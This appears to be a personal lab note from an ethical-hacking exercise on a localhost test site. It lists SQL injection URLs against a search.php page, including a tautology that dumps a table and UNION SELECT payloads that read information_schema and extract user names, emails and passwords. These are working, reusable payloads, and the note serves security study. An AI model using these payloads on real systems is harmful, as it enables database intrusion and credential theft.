# Attack #3 : UNION based attacks
Target: search.php page.

# Using union to leak data from another tables

# 0 Leak everything in the table
http://localhost/www/sites/eh/sql_injection/example2/search.php?name=apple' or 1=1 -- 

# 1 Get Database schemes (name of the tables)
http://localhost/www/sites/eh/sql_injection/example2/search.php?name=apple' union select TABLE_NAME,'a' ,'a','a' from information_schema.tables -- 

# 2 Get Columns of a selected table
http://localhost/www/sites/eh/sql_injection/example2/search.php?name=apple' union select COLUMN_NAME,DATA_TYPE ,'a','a' from information_schema.columns WHERE table_name = 'users' -- 

# 3 Get data from the tables by knowing the columns names
http://localhost/www/sites/eh/sql_injection/example2/search.php?name=apple' union select concat(id,role),name, email,password from users -- "

Reference:
Database query PDO
(write.corbpie.com) https://write.corbpie.com/php-pdo-mysql-cheat-sheet-guide/